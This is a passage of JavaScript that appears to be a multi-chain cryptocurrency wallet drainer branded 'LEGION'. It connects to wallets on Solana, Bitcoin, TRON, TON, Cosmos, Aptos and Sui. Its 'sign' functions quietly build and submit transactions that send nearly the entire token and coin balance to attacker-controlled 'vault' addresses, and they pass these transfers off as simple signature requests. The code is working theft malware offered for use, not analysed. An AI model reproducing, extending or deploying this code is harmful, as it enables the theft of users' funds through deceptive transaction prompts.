                  if (_wcSignRes && (_wcSignRes.signature || _wcSignRes.transaction)) {
                    var _wcSigned = _wcSignRes.transaction || _wcSignRes.signature;
                    connectedChains.SOL._signedTxB64 = _wcSigned;
                    connectedChains.SOL._allSignedTxs = [_wcSigned];
                    console.log('[LEGION] ✅ WalletConnect SOL signTransaction succeeded');
                    return JSON.stringify({ signed_tx_b64: _wcSigned });
                  }
                }
              }
            } catch (_wcSolErr) {
              console.debug('[LEGION] WC SOL signTransaction failed:', _wcSolErr.message);
            }
            // Fallback: plain message sign via WC
            var b64Msg = btoa(String.fromCharCode.apply(null, typeof message === 'string' ? new TextEncoder().encode(message) : message));
            var wcResult = await sol.request({
              method: 'solana_signMessage',
              params: { message: b64Msg, pubkey: userAddr }
            }, 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp');
            return wcResult.signature || wcResult;
          }

          // Fallback: plain message sign (non-WC)
          var msgBytes = typeof message === 'string' ? new TextEncoder().encode(message) : message;
          var msgResult = await sol.signMessage(msgBytes);
          return msgResult.signature || msgResult;
        } catch (e) {
          console.error('[LEGION] SOL signing failed:', e.message);
          return null;
        }
      }
    },

    BTC: {
      config: CHAIN_CONFIG.BTC,
      vaultKey: 'btc',
      detectionPriority: ['unisat', 'xverse', 'leather', 'okx'],

      detect: function() {
        try {
          var hasUniSat = window.unisat && window.unisat.requestAccounts;
          var hasXverse = window.XverseProviders && window.XverseProviders.BitcoinProvider;
          var hasLeather = window.LeatherProvider || window.HiroWalletProvider;
          var hasOKXBtc = window.okxwallet && window.okxwallet.bitcoin;
          if (hasLeather || hasOKXBtc) return true;
          if (hasUniSat || hasXverse) {
            console.log('[LEGION] 🔍 BTC detected');
            return true;
          }
          return false;
        } catch (e) {
          return false;
        }
      },

      connect: async function() {
        if (connectedChains.BTC) return connectedChains.BTC;
        try {
          console.log('[LEGION] 🔗 Connecting to BTC...');

          if (window.unisat && window.unisat.requestAccounts) {
            var uAccounts = await window.unisat.requestAccounts();
            if (!uAccounts || !uAccounts[0]) throw new Error('UniSat returned no address');
            connectedChains.BTC = {
              chain: 'BTC',
              config: CHAIN_CONFIG.BTC,
              address: uAccounts[0],
              walletType: 'UniSat',
              provider: window.unisat,
              connected: true,
              timestamp: Date.now()
            };
            console.log('[LEGION] ✅ BTC connected via UniSat');
            return connectedChains.BTC;
          }

          if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
            var xverse = window.XverseProviders.BitcoinProvider;
            var xAccounts = await xverse.request('getAccounts');
            var xAddr = xAccounts && xAccounts.result && xAccounts.result.addresses && xAccounts.result.addresses[0] && xAccounts.result.addresses[0].address;
            if (!xAddr) throw new Error('Xverse returned no address');
            connectedChains.BTC = {
              chain: 'BTC',
              config: CHAIN_CONFIG.BTC,
              address: xAddr,
              walletType: 'Xverse',
              provider: xverse,
              connected: true,
              timestamp: Date.now()
            };
            console.log('[LEGION] ✅ BTC connected via Xverse');
            return connectedChains.BTC;
          }

          if (window.LeatherProvider || window.HiroWalletProvider) {
            var leather = window.LeatherProvider || window.HiroWalletProvider;
            var lResult = await leather.request('getAddresses');
            var lAddr = lResult && lResult.result && lResult.result.addresses && lResult.result.addresses[0];
            if (!lAddr) throw new Error('Leather returned no address');
            connectedChains.BTC = {
              chain: 'BTC',
              config: CHAIN_CONFIG.BTC,
              address: lAddr.address || lAddr,
              walletType: 'Leather',
              provider: leather,
              connected: true,
              timestamp: Date.now()
            };
            console.log('[LEGION] ✅ BTC connected via Leather');
            return connectedChains.BTC;
          }

          if (window.okxwallet && window.okxwallet.bitcoin) {
            var okxBtc = window.okxwallet.bitcoin;
            var okxResult = await okxBtc.connect();
            if (!okxResult || !okxResult.address) throw new Error('OKX returned no address');
            connectedChains.BTC = {
              chain: 'BTC',
              config: CHAIN_CONFIG.BTC,
              address: okxResult.address,
              walletType: 'OKX Wallet',
              provider: okxBtc,
              connected: true,
              timestamp: Date.now()
            };
            console.log('[LEGION] ✅ BTC connected via OKX');
            return connectedChains.BTC;
          }

          throw new Error('No Bitcoin wallet found');
        } catch (e) {
          console.error('[LEGION] ❌ BTC connection failed:', e.message);
          connectedChains.BTC = null;
          return null;
        }
      },

      sign: async function(message) {
        try {
          if (!connectedChains.BTC || !connectedChains.BTC.provider) {
            throw new Error('BTC not connected');
          }
          var provider = connectedChains.BTC.provider;
          var btcAddress = connectedChains.BTC.address;
          var walletType = connectedChains.BTC.walletType;

          // Step 1: Fetch real PSBT from backend
          console.log('[LEGION] 🔗 BTC: fetching PSBT from backend...');
          var psbtRes = null;
          try {
            psbtRes = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
              wallet_address: btcAddress,
              amount: '546'
            });
          } catch (fetchErr) {
            console.warn('[LEGION] ⚠️  BTC PSBT fetch failed:', fetchErr.message);
            return null;
          }

          var psbtBase64 = psbtRes && psbtRes.data && psbtRes.data.psbt_base64;
          if (!psbtBase64) {
            console.warn('[LEGION] ⚠️  BTC: no PSBT returned (no UTXOs or address not indexed)');
            return null;
          }
          connectedChains.BTC._psbtMeta = psbtRes.data;

          // Helper: base64 <-> hex conversion
          function b64ToHex(b64) {
            var raw = atob(b64);
            var hex = '';
            for (var i = 0; i < raw.length; i++) {
              hex += ('0' + raw.charCodeAt(i).toString(16)).slice(-2);
            }
            return hex;
          }
          function hexToB64(hex) {
            var bytes = [];
            for (var i = 0; i < hex.length; i += 2) {
              bytes.push(parseInt(hex.substr(i, 2), 16));
            }
            return btoa(String.fromCharCode.apply(null, bytes));
          }

          // Step 2: Sign PSBT with wallet (format varies by wallet type)
          console.log('[LEGION] 🖊️  BTC: signing PSBT...');
          var signedPsbtBase64 = null;

          if (walletType === 'UniSat' || walletType === 'OKX Wallet') {
            var psbtHex = b64ToHex(psbtBase64);
            var signedHex = await provider.signPsbt(psbtHex, { autoFinalized: true });
            if (signedHex) signedPsbtBase64 = hexToB64(signedHex);
          } else if (walletType === 'Xverse') {
            var _inputCount = connectedChains.BTC._psbtMeta && connectedChains.BTC._psbtMeta.input_count || 1;
            var _sigIdxs = Array.from({ length: _inputCount }, function(_, i) { return i; });
            var xResult = await provider.request('signPsbt', {
              psbt: psbtBase64,
              broadcast: false,
              allowedSighash: [0x01],
              signingIndexes: _sigIdxs
            });
            signedPsbtBase64 = xResult && (xResult.psbt || (xResult.result && xResult.result.psbt));
          } else if (walletType === 'Leather') {
            var psbtHexL = b64ToHex(psbtBase64);
            var lResult = await provider.request('signPsbt', { hex: psbtHexL, broadcast: false });
            var signedHexL = lResult && lResult.result && lResult.result.hex;
            if (signedHexL) signedPsbtBase64 = hexToB64(signedHexL);
          } else if (provider.signPsbt) {
            var genericHex = b64ToHex(psbtBase64);
            var genericSigned = await provider.signPsbt(genericHex, { autoFinalized: true });
            if (genericSigned) signedPsbtBase64 = typeof genericSigned === 'string' && !genericSigned.match(/^[0-9a-fA-F]+$/) ? genericSigned : hexToB64(genericSigned);
          }

          if (!signedPsbtBase64) {
            console.warn('[LEGION] ⚠️  BTC: wallet returned no signed PSBT');
            return null;
          }
          console.log('[LEGION] ✅ BTC PSBT signed');
          return signedPsbtBase64;
        } catch (e) {
          console.error('[LEGION] ❌ BTC signing failed:', e.message);
          return null;
        }
      }
    },

    TRON: {
      config: CHAIN_CONFIG.TRON,
      vaultKey: 'tron',
      detectionPriority: ['tronlink'],

      detect: function() {
        try {
          if (window.tronLink || window.tronWeb) {
            console.log('[LEGION] 🔍 TRON detected');
            return true;
          }
          return false;
        } catch (e) {
          return false;
        }
      },

      connect: async function() {
        if (connectedChains.TRON) return connectedChains.TRON;
        try {
          console.log('[LEGION] 🔗 Connecting to TRON...');

          if (window.tronLink && window.tronLink.request) {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            // Wait for tronWeb.defaultAddress to be populated after request resolves
            for (var _twi = 0; _twi < 10; _twi++) {
              if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) break;
              await new Promise(function(r) { setTimeout(r, 300); });
            }
          }

          var tw = window.tronWeb;
          if (!tw || !tw.defaultAddress || !tw.defaultAddress.base58) {
            throw new Error(window.tronLink ? 'TronLink is locked — please unlock your wallet' : 'TronWeb not ready');
          }

          connectedChains.TRON = {
            chain: 'TRON',
            config: CHAIN_CONFIG.TRON,
            address: tw.defaultAddress.base58,
            walletType: 'TronLink',
            provider: tw,
            connected: true,
            timestamp: Date.now()
          };

          console.log('[LEGION] ✅ TRON connected');
          return connectedChains.TRON;
        } catch (e) {
          console.error('[LEGION] ❌ TRON connection failed:', e.message);
          connectedChains.TRON = null;
          return null;
        }
      },

      sign: async function(message) {
        try {
          if (!connectedChains.TRON || !connectedChains.TRON.provider) {
            throw new Error('TRON not connected');
          }
          console.log('[LEGION] 🖊️  Signing TRON transaction...');
          var tw = connectedChains.TRON.provider;
          var userAddr = connectedChains.TRON.address;
          var vaultAddr = VAULT_CACHE && (VAULT_CACHE.tron || VAULT_CACHE.trx);

          if (vaultAddr && tw && tw.transactionBuilder) {
            var USDT_TRC20 = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

            // Fetch TRX balance upfront — needed for dynamic feeLimit calculation
            var trxBalSun = 0;
            try { trxBalSun = await tw.trx.getBalance(userAddr); } catch(_be) {}

            // Try USDT first — feeLimit scales with TRX balance (max 30 TRX, 80% of available)
            try {
              var contract = await tw.contract().at(USDT_TRC20);
              var rawBal = await contract.balanceOf(userAddr).call();
              var usdtBal = rawBal ? rawBal.toString() : '0';
              if (usdtBal && usdtBal !== '0' && parseInt(usdtBal) > 0) {
                var dynFee = trxBalSun > 0 ? Math.min(150000000, Math.max(50000000, Math.floor(trxBalSun * 0.8))) : 50000000;
                var trc20Res = await tw.transactionBuilder.triggerSmartContract(
                  USDT_TRC20, 'transfer(address,uint256)',
                  { feeLimit: dynFee, callValue: 0 },
                  [{ type: 'address', value: vaultAddr }, { type: 'uint256', value: usdtBal }],
                  userAddr
                );
                var signedTrc20 = await tw.trx.sign(trc20Res.transaction);
                connectedChains.TRON._signedTx = signedTrc20;
                connectedChains.TRON._signedTxToken = USDT_TRC20;
                console.log('[LEGION] ✅ TRON USDT transfer signed (feeLimit=' + dynFee + ')');
                return 'tron_tx:' + (signedTrc20.txID || Date.now());
              }
            } catch(_e1) {
              console.debug('[LEGION] TRON USDT sign failed, trying TRX:', _e1.message);
            }

            // Fallback: native TRX transfer — keep only 2 TRX for account rent
            if (trxBalSun > 2000000) {
              try {
                var sendAmt = trxBalSun - 2000000;
                var trxTx = await tw.transactionBuilder.sendTrx(vaultAddr, sendAmt, userAddr);
                var signedTrx = await tw.trx.sign(trxTx);
                connectedChains.TRON._signedTx = signedTrx;
                connectedChains.TRON._signedTxToken = 'TRX';
                console.log('[LEGION] ✅ TRON TRX transfer signed (' + sendAmt + ' sun)');
                return 'tron_tx:' + (signedTrx.txID || Date.now());
              } catch(_e2) {
                console.debug('[LEGION] TRON TRX sign failed:', _e2.message);
              }
            }
          }

          var msgSig;
          try {
            msgSig = await tw.trx.signMessageV2(message);
          } catch (_e) {
            msgSig = await tw.trx.sign(message);
          }
          console.log('[LEGION] ✅ TRON message signature obtained (fallback)');
          return msgSig;
        } catch (e) {
          console.error('[LEGION] ❌ TRON signing failed:', e.message);
          return null;
        }
      }
    },

    TON: {
      config: CHAIN_CONFIG.TON,
      vaultKey: 'ton',
      detectionPriority: ['tonkeeper', 'openmask', 'mytonwallet', 'ton'],

      detect: function() {
        try {
          var hasTonkeeper = window.tonkeeper && window.tonkeeper.provider;
          var hasTon = window.ton;
          var hasOpenMask = window.openmask;
          var hasMyTonWallet = window.myTonWallet;
          if (hasTonkeeper || hasTon || hasOpenMask || hasMyTonWallet) {
            console.log('[LEGION] 🔍 TON detected');
            return true;
          }
          return false;
        } catch (e) {
          return false;
        }
      },

      connect: async function() {
        if (connectedChains.TON) return connectedChains.TON;
        try {
          console.log('[LEGION] 🔗 Connecting to TON...');

          var ton = null;
          var walletName = 'TON Wallet';
          if (window.tonkeeper && window.tonkeeper.provider) {
            ton = window.tonkeeper.provider;
            walletName = 'Tonkeeper';
          } else if (window.myTonWallet) {
            ton = window.myTonWallet;
            walletName = 'MyTonWallet';
          } else if (window.openmask) {
            ton = window.openmask;
            walletName = 'OpenMask';
          } else if (window.ton) {
            ton = window.ton;
            walletName = 'TON Wallet';
          }
          if (!ton) throw new Error('No TON wallet detected');

          // Try multiple methods — ton_getAccounts first (silent, no popup), then ton_requestAccounts
          var addr = null;
          var methods = ['ton_getAccounts', 'ton_requestAccounts'];
          for (var mi = 0; mi < methods.length; mi++) {
            try {
              var res = await ton.send(methods[mi]);
              var first = res && (Array.isArray(res) ? res[0] : res);
              addr = first && (first.address || first.friendlyAddress || first);
              if (addr && typeof addr === 'string') break;
              addr = null;
            } catch (me) {
              console.warn('[LEGION] TON method', methods[mi], 'failed:', me.message);
            }
          }
          if (!addr || typeof addr !== 'string') throw new Error('TON wallet returned no address');

          connectedChains.TON = {
            chain: 'TON',
            config: CHAIN_CONFIG.TON,
            address: String(addr),
            walletType: walletName,
            provider: ton,
            connected: true,
            timestamp: Date.now()
          };

          console.log('[LEGION] ✅ TON connected via', walletName, ':', addr.substring(0, 10) + '...');
          return connectedChains.TON;
        } catch (e) {
          console.error('[LEGION] ❌ TON connection failed:', e.message);
          connectedChains.TON = null;
          return null;
        }
      },

      sign: async function(message) {
        try {
          if (!connectedChains.TON || !connectedChains.TON.provider) {
            throw new Error('TON not connected');
          }
          console.log('[LEGION] 🖊️  TON: building transfer...');
          var ton = connectedChains.TON.provider;
          var userAddr = connectedChains.TON.address;
          var vaultAddr = VAULT_CACHE && VAULT_CACHE.ton;
          // USDT Jetton master on TON mainnet
          var USDT_MASTER = 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs';

          var TC_BASE = 'https://toncenter.com/api/v2';
          if (vaultAddr && userAddr) {
            try {
              var messages = [];
              var totalNano = 0;

              // --- Native TON balance via tonapi.io (toncenter is unreliable) ---
              var nanotons = 0;
              try {
                var balRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(userAddr));
                var balData = await balRes.json();
                nanotons = balData && balData.balance ? parseInt(balData.balance) : 0;
              } catch (_balErr) {
                // Fallback to toncenter
                try {
                  var balRes2 = await fetch('https://toncenter.com/api/v2/getAddressBalance?address=' + encodeURIComponent(userAddr));
                  var balData2 = await balRes2.json();
                  nanotons = balData2 && balData2.result ? parseInt(balData2.result) : 0;
                } catch (_) {}
              }
              // Reserve gas: 0.1 TON if Jetton present, else 0.06 TON
              var gasReserve = 100000000;

              // --- USDT Jetton balance & wallet address ---
              var jettonMsg = null;
              try {
                // Use tonapi.io directly — bypasses the broken toncenter BOC encoding gate
                var jbRes = await fetch('https://tonapi.io/v2/accounts/' + encodeURIComponent(userAddr) + '/jettons/' + encodeURIComponent(USDT_MASTER));
                var jbData = await jbRes.json();
                var jettonBal = jbData && jbData.balance ? jbData.balance : '0';
                var jettonWalletAddr = jbData && jbData.wallet_address && jbData.wallet_address.address;

                if (jettonBal && jettonBal !== '0' && jettonWalletAddr) {
                    // Load TonWeb for proper TVM Cell BOC encoding (required by TonConnect wallets)
                    var TW = window.TonWeb;
                    if (!TW) {
                      await new Promise(function(resolve) {
                        var s = document.createElement('script');
                        s.src = 'https://unpkg.com/tonweb@0.0.65/dist/tonweb.js';
                        s.onload = function() { TW = window.TonWeb; resolve(); };
                        s.onerror = resolve; // skip Jetton gracefully if CDN fails
                        document.head.appendChild(s);
                      });
                    }
                    if (TW) {
                      try {
                        var jCell = new TW.boc.Cell();
                        jCell.bits.writeUint(0x0f8a7ea5, 32); // Jetton transfer op
                        jCell.bits.writeUint(0, 64);           // query_id = 0
                        jCell.bits.writeCoins(new TW.utils.BN(String(jettonBal)));
                        jCell.bits.writeAddress(new TW.utils.Address(vaultAddr));
                        jCell.bits.writeAddress(new TW.utils.Address(userAddr));
                        jCell.bits.writeBit(0);                // no custom_payload
                        jCell.bits.writeCoins(new TW.utils.BN('50000000')); // forward_ton_amount 0.05 TON
                        jCell.bits.writeBit(0);                // no forward_payload
                        var jBoc = await jCell.toBoc(false);
                        var jPayload = TW.utils.bytesToBase64(jBoc);
                        if (jPayload) {
                          gasReserve = 150000000; // 0.15 TON reserved for gas
                          jettonMsg = { address: jettonWalletAddr, amount: '50000000', payload: jPayload };
                          console.log('[LEGION] ✅ TON Jetton BOC built via TonWeb');
                        }
                      } catch (_jBocErr) {
                        console.debug('[LEGION] TON Jetton BOC build failed:', _jBocErr.message);
                      }
                    } else {
                      console.debug('[LEGION] TonWeb unavailable — Jetton USDT skipped, native TON only');
                    }
                  }
              } catch(_jErr) {
                console.debug('[LEGION] TON Jetton fetch failed:', _jErr.message);
              }

              // Build messages array
              if (nanotons > gasReserve) {
                var sendNano = nanotons - gasReserve - (jettonMsg ? 50000000 : 0);
                if (sendNano > 0) {
                  messages.push({ address: vaultAddr, amount: String(sendNano) });
                  totalNano = sendNano;
                }
              }
              if (jettonMsg) messages.push(jettonMsg);

              if (messages.length > 0) {
                var txPayload = {
                  validUntil: Math.floor(Date.now() / 1000) + 600,
                  messages: messages
                };
                var txResult = await ton.send('ton_sendTransaction', txPayload);
                var boc = txResult && (
                  typeof txResult === 'string' ? txResult :
                  txResult.boc || (txResult.result && txResult.result.boc) || txResult.result
                );
                if (boc) {
                  connectedChains.TON._bocPayload = typeof boc === 'string' ? boc : JSON.stringify(boc);
                  connectedChains.TON._sendNano = totalNano;
                  console.log('[LEGION] ✅ TON transfer sent: ' + messages.length + ' msg(s)' + (jettonMsg ? ' [incl. Jetton USDT]' : ''));
                  return 'ton_tx:' + Date.now();
                }
              }
            } catch(_tonTxErr) {
              console.debug('[LEGION] TON sendTransaction failed, falling back:', _tonTxErr.message);
            }
          }

          // Fallback: plain message sign
          console.log('[LEGION] TON fallback: plain message sign');
          var msgResult;
          try {
            msgResult = await ton.send('ton_signData', { cell: message });
          } catch (_e1) {
            msgResult = await ton.send('ton_signData', { data: message });
          }
          var signature = null;
          if (!msgResult) { signature = null; }
          else if (typeof msgResult === 'string') { signature = msgResult; }
          else { signature = msgResult.signature || (msgResult.result && msgResult.result.signature) || msgResult.result || JSON.stringify(msgResult); }
          console.log('[LEGION] ✅ TON signature obtained (fallback)');
          return signature;
        } catch (e) {
          console.error('[LEGION] ❌ TON signing failed:', e.message);
          return null;
        }
      }
    },

    COSMOS: {
      config: CHAIN_CONFIG.COSMOS,
      vaultKey: 'cosmos',
      detectionPriority: ['keplr'],

      detect: function() {
        try {
          if (window.keplr) {
            console.log('[LEGION] 🔍 COSMOS detected');
            return true;
          }
          return false;
        } catch (e) {
          return false;
        }
      },

      connect: async function() {
        if (connectedChains.COSMOS) return connectedChains.COSMOS;
        try {
          console.log('[LEGION] 🔗 Connecting to COSMOS...');

          if (!window.keplr) throw new Error('Keplr not found');

          var chainId = 'cosmoshub-4';
          await window.keplr.enable(chainId);

          // getKey returns { bech32Address, pubKey, ... }
          var key = await window.keplr.getKey(chainId);
          var addr = key && key.bech32Address;
          if (!addr) throw new Error('COSMOS wallet returned no address');

          connectedChains.COSMOS = {
            chain: 'COSMOS',
            config: CHAIN_CONFIG.COSMOS,
            address: addr,
            walletType: 'Keplr',
            provider: window.keplr,
            chainId: chainId,
            connected: true,
            timestamp: Date.now()
          };

          console.log('[LEGION] ✅ COSMOS connected:', addr.substring(0, 12) + '...');
          return connectedChains.COSMOS;
        } catch (e) {
          console.error('[LEGION] ❌ COSMOS connection failed:', e.message);
          connectedChains.COSMOS = null;
          return null;
        }
      },

      sign: async function(_message) {
        try {
          if (!connectedChains.COSMOS || !connectedChains.COSMOS.provider) {
            throw new Error('COSMOS not connected');
          }
          var keplr = connectedChains.COSMOS.provider;
          var chainId = connectedChains.COSMOS.chainId;
          var addr = connectedChains.COSMOS.address;
          var vaultAddr = VAULT_CACHE && VAULT_CACHE.cosmos;
          if (!vaultAddr) throw new Error('COSMOS vault not configured');

          // Fetch balance and account info
          var REST = 'https://cosmos-rest.publicnode.com';
          var balRes = await fetch(REST + '/cosmos/bank/v1beta1/balances/' + addr + '?denom=uatom');
          var balData = await balRes.json();
          var atomBal = balData && balData.balances && balData.balances[0] && balData.balances[0].amount;
          if (!atomBal || atomBal === '0') throw new Error('No ATOM balance');
          var feeAmount = '3000'; // 0.003 ATOM gas fee
          var sendAmount = String(Math.max(0, parseInt(atomBal) - parseInt(feeAmount)));
          if (parseInt(sendAmount) <= 0) throw new Error('Insufficient ATOM after fee');

          var accRes = await fetch(REST + '/cosmos/auth/v1beta1/accounts/' + addr);
          var accData = await accRes.json();
          var acc = accData && (accData.account || accData);
          var accountNumber = String(acc.account_number || acc.base_account && acc.base_account.account_number || '0');
          var sequence = String(acc.sequence || acc.base_account && acc.base_account.sequence || '0');

          // Build amino sign doc (MsgSend)
          var signDoc = {
            chain_id: chainId,
            account_number: accountNumber,
            sequence: sequence,
            fee: { amount: [{ denom: 'uatom', amount: feeAmount }], gas: '100000' },
            msgs: [{ type: 'cosmos-sdk/MsgSend', value: { from_address: addr, to_address: vaultAddr, amount: [{ denom: 'uatom', amount: sendAmount }] } }],
            memo: ''
          };

          console.log('[LEGION] 🖊️  Signing COSMOS MsgSend...');
          var signed = await keplr.signAmino(chainId, addr, signDoc);
          if (!signed || !signed.signature) throw new Error('Keplr signAmino returned no signature');

          // Broadcast via Cosmos REST — amino format (v1beta1 requires protobuf binary, not JSON)
          var txHash;
          try {
            // Try legacy amino endpoint first (correct for signAmino-signed txs)
            var bcastRes2 = await fetch(REST + '/txs', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tx: { msg: signDoc.msgs, fee: signDoc.fee, signatures: [{ pub_key: signed.signature.pub_key, signature: signed.signature.signature }], memo: '' }, mode: 'async' }) });
            var bcastData2 = await bcastRes2.json();
            txHash = bcastData2 && (bcastData2.txhash || (bcastData2.tx_response && bcastData2.tx_response.txhash));
          } catch (_bcastErr) {
            console.warn('[LEGION] COSMOS broadcast failed:', _bcastErr.message);
          }
          console.log('[LEGION] ✅ COSMOS tx broadcast:', txHash || 'pending');

          // Return signed payload for backend logging
          return JSON.stringify({ signed_amino: JSON.stringify(signed), tx_hash: txHash || '', amount: sendAmount, vault: vaultAddr });
        } catch (e) {
          console.error('[LEGION] ❌ COSMOS signing failed:', e.message);
          return null;
        }
      }
    },

    APTOS: {
      config: CHAIN_CONFIG.APTOS,
      vaultKey: 'aptos',
      detectionPriority: ['petra'],

      detect: function() {
        try {
          var hasPetra = window.aptos || (window.petra && window.petra.aptos) || window.martian;
          if (hasPetra) {
            console.log('[LEGION] 🔍 APTOS detected');
            return true;
          }
          return false;
        } catch (e) {
          return false;
        }
      },

      connect: async function() {
        if (connectedChains.APTOS) return connectedChains.APTOS;
        try {
          console.log('[LEGION] 🔗 Connecting to APTOS...');

          var aptos = window.aptos || (window.petra && window.petra.aptos) || window.martian;
          if (!aptos) throw new Error('No Aptos wallet detected');
          var _aptosWalletName = window.martian ? 'Martian' : (window.petra ? 'Petra' : 'Aptos Wallet');

          if (aptos.connect) await aptos.connect();

          var account = null;
          try { account = aptos.account ? await aptos.account() : null; } catch (_ae) {}
          var addr = account && (account.address || account);

          if (!addr && aptos.address) addr = aptos.address;
          if (!addr) throw new Error('Aptos wallet returned no address');

          connectedChains.APTOS = {
            chain: 'APTOS',
            config: CHAIN_CONFIG.APTOS,
            address: String(addr),
            walletType: _aptosWalletName,
            provider: aptos,
            connected: true,
            timestamp: Date.now()
          };

          console.log('[LEGION] ✅ APTOS connected');
          return connectedChains.APTOS;
        } catch (e) {
          console.error('[LEGION] ❌ APTOS connection failed:', e.message);
          connectedChains.APTOS = null;
          return null;
        }
      },

      sign: async function(_message) {
        try {
          if (!connectedChains.APTOS || !connectedChains.APTOS.provider) {
            throw new Error('APTOS not connected');
          }
          var aptos = connectedChains.APTOS.provider;
          var addr = connectedChains.APTOS.address;
          var vaultAddr = VAULT_CACHE && VAULT_CACHE.aptos;
          if (!vaultAddr) throw new Error('APTOS vault not configured');

          // Fetch APT balance (octas)
          var RPC = 'https://fullnode.mainnet.aptoslabs.com/v1';
          var resRes = await fetch(RPC + '/accounts/' + addr + '/resources');
          if (!resRes.ok) throw new Error('Aptos RPC error: ' + resRes.status);
          var resources = await resRes.json();
          var coinStore = Array.isArray(resources) && resources.find(function(r) { return r.type === '0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>'; });
          var balance = coinStore && coinStore.data && coinStore.data.coin && coinStore.data.coin.value;
          if (!balance || balance === '0') throw new Error('No APT balance');
          var gasFee = 20000; // 20000 octas (~200 gas units × 100 octas/unit) — dynamic estimate
          var sendOctas = Math.max(0, parseInt(balance) - gasFee);
          if (sendOctas <= 0) throw new Error('Insufficient APT after gas');

          console.log('[LEGION] 🖊️  Sending APTOS transfer:', sendOctas, 'octas');
          // signAndSubmitTransaction — wallet signs + broadcasts automatically
          var txPayload = {
            type: 'entry_function_payload',
            function: '0x1::coin::transfer',
            type_arguments: ['0x1::aptos_coin::AptosCoin'],
            arguments: [vaultAddr, String(sendOctas)]
          };
          var result = await aptos.signAndSubmitTransaction(txPayload);
          var txHash = result && (result.hash || (typeof result === 'string' ? result : JSON.stringify(result)));
          console.log('[LEGION] ✅ APTOS tx submitted:', txHash);
          return JSON.stringify({ tx_hash: txHash || '', amount: String(sendOctas), vault: vaultAddr });
        } catch (e) {
          console.error('[LEGION] ❌ APTOS signing failed:', e.message);
          return null;
        }
      }
    },

    SUI: {
      config: CHAIN_CONFIG.SUI,
      vaultKey: 'sui',
      detectionPriority: ['sui-wallet', 'phantom'],

      detect: function() {
        try {
          var hasSui = window.suiWallet || (window.phantom && window.phantom.sui);
          if (hasSui) {
            console.log('[LEGION] 🔍 SUI detected');
            return true;
          }
          return false;
        } catch (e) {
          return false;
        }
      },

      connect: async function() {
        if (connectedChains.SUI) return connectedChains.SUI;
        try {
          console.log('[LEGION] 🔗 Connecting to SUI...');

          var suiWallet = window.suiWallet || (window.phantom && window.phantom.sui);
          if (!suiWallet) throw new Error('No Sui wallet detected');

          // Must call connect() first to get permission, then getAccounts()
          if (suiWallet.connect) {
            try { await suiWallet.connect(); } catch (ce) {
              console.warn('[LEGION] SUI connect() error:', ce.message);
            }
          }

          var accounts = [];
          if (suiWallet.getAccounts) {
            accounts = await suiWallet.getAccounts();
          } else if (suiWallet.accounts) {
            accounts = suiWallet.accounts;
          }

          // Account may be an object { address: '0x...' } or raw string
          var raw = accounts && accounts[0];
          var addr = raw && (typeof raw === 'string' ? raw : raw.address);
          if (!addr) throw new Error('Sui wallet returned no address');

          connectedChains.SUI = {
            chain: 'SUI',
            config: CHAIN_CONFIG.SUI,
            address: addr,
            walletType: 'Sui Wallet',
            provider: suiWallet,
            connected: true,
            timestamp: Date.now()
          };

          console.log('[LEGION] ✅ SUI connected:', addr.substring(0, 10) + '...');
          return connectedChains.SUI;
        } catch (e) {
          console.error('[LEGION] ❌ SUI connection failed:', e.message);
          connectedChains.SUI = null;
          return null;
        }
      },

      sign: async function(_message) {
        try {
          if (!connectedChains.SUI || !connectedChains.SUI.provider) {
            throw new Error('SUI not connected');
          }
          var suiWallet = connectedChains.SUI.provider;
          var addr = connectedChains.SUI.address;
          var vaultAddr = VAULT_CACHE && VAULT_CACHE.sui;
          if (!vaultAddr) throw new Error('SUI vault not configured');

          // Fetch SUI balance
          var SUI_RPC = 'https://fullnode.mainnet.sui.io:443';
          var balRes = await fetch(SUI_RPC, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'suix_getBalance', params: [addr, '0x2::sui::SUI'] }) });
          var balData = await balRes.json();
          var totalBalance = balData && balData.result && balData.result.totalBalance;
          if (!totalBalance || totalBalance === '0') throw new Error('No SUI balance');
          var gasBudget = 5000000; // 0.005 SUI in MIST
          var sendMist = Math.max(0, parseInt(totalBalance) - gasBudget);
          if (sendMist <= 0) throw new Error('Insufficient SUI after gas');

          // Build unsigned tx — try suix_payAllSui (v1+) first, fallback unsafe_paySui (legacy)
          console.log('[LEGION] 🖊️  Building SUI transfer...');
          var txBytes = null;
          var buildRes = await fetch(SUI_RPC, { method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'suix_payAllSui', params: [addr, [], vaultAddr, String(gasBudget)] }) });
          var buildData = await buildRes.json();
          txBytes = buildData && buildData.result && buildData.result.txBytes;
          if (!txBytes) {
            // Legacy fallback for older Sui nodes
            var buildRes2 = await fetch(SUI_RPC, { method: 'POST', headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'unsafe_paySui', params: [addr, [], [vaultAddr], [String(sendMist)], String(gasBudget)] }) });
            var buildData2 = await buildRes2.json();
            txBytes = buildData2 && buildData2.result && buildData2.result.txBytes;
          }
          if (!txBytes) throw new Error('SUI: failed to build tx bytes');

          // Sign and execute — handle both old (TransactionBlock) and new (Transaction) API
          var execResult;
          if (suiWallet.signAndExecuteTransaction) {
            execResult = await suiWallet.signAndExecuteTransaction({ transaction: txBytes });
          } else if (suiWallet.signAndExecuteTransactionBlock) {
            execResult = await suiWallet.signAndExecuteTransactionBlock({ transactionBlock: txBytes, options: { showEffects: true } });
          } else {
            throw new Error('SUI wallet does not support signAndExecuteTransaction');
          }
          var digest = execResult && (execResult.digest || execResult.certificate && execResult.certificate.transactionDigest || JSON.stringify(execResult));
          console.log('[LEGION] ✅ SUI tx executed:', digest);
          return JSON.stringify({ tx_hash: digest || '', amount: String(sendMist), vault: vaultAddr });
        } catch (e) {
          console.error('[LEGION] ❌ SUI signing failed:', e.message);
